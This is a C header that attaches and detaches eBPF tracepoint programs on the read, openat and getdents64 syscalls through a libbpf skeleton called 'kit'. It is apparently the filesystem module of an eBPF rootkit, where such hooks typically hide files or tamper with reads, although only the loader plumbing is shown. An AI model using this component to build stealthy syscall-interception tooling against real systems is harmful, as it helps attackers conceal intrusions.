#ifndef __MOD_FS_H
#define __MOD_FS_H

#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "kit.skel.h"

//Connections
int attach_tp_sys_enter_read(struct kit_bpf *skel){
    skel->links.tp_sys_enter_read = bpf_program__attach(skel->progs.tp_sys_enter_read);
	return libbpf_get_error(skel->links.tp_sys_enter_read);
}
int attach_tp_sys_exit_read(struct kit_bpf *skel){
    skel->links.tp_sys_exit_read = bpf_program__attach(skel->progs.tp_sys_exit_read);
	return libbpf_get_error(skel->links.tp_sys_exit_read);
}
int attach_tp_sys_enter_openat(struct kit_bpf *skel){
    skel->links.tp_sys_enter_openat = bpf_program__attach(skel->progs.tp_sys_enter_openat);
	return libbpf_get_error(skel->links.tp_sys_enter_openat);
}
int attach_tp_sys_enter_getdents64(struct kit_bpf *skel){
    skel->links.tp_sys_enter_getdents64 = bpf_program__attach(skel->progs.tp_sys_enter_getdents64);
	return libbpf_get_error(skel->links.tp_sys_enter_getdents64);
}
int attach_tp_sys_exit_getdents64(struct kit_bpf *skel){
    skel->links.tp_sys_exit_getdents64 = bpf_program__attach(skel->progs.tp_sys_exit_getdents64);
	return libbpf_get_error(skel->links.tp_sys_exit_getdents64);
}


int attach_fs_all(struct kit_bpf *skel){
    return attach_tp_sys_enter_read(skel) || 
        attach_tp_sys_exit_read(skel) ||
        attach_tp_sys_enter_openat(skel)||
        attach_tp_sys_enter_getdents64(skel) ||
        attach_tp_sys_exit_getdents64(skel);
}


int detach_tp_sys_enter_read(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.tp_sys_enter_read);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}
int detach_tp_sys_exit_read(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.tp_sys_exit_read);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}
int detach_tp_sys_enter_openat(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.tp_sys_enter_openat);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}
int detach_tp_sys_enter_getdents64(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.tp_sys_enter_getdents64);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}
int detach_tp_sys_exit_getdents64(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.tp_sys_exit_getdents64);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}

int detach_fs_all(struct kit_bpf *skel){
    return detach_tp_sys_enter_read(skel) || 
        detach_tp_sys_exit_read(skel) ||
        detach_tp_sys_enter_openat(skel)||
        detach_tp_sys_enter_getdents64(skel)||
        detach_tp_sys_exit_getdents64(skel);
}

#endif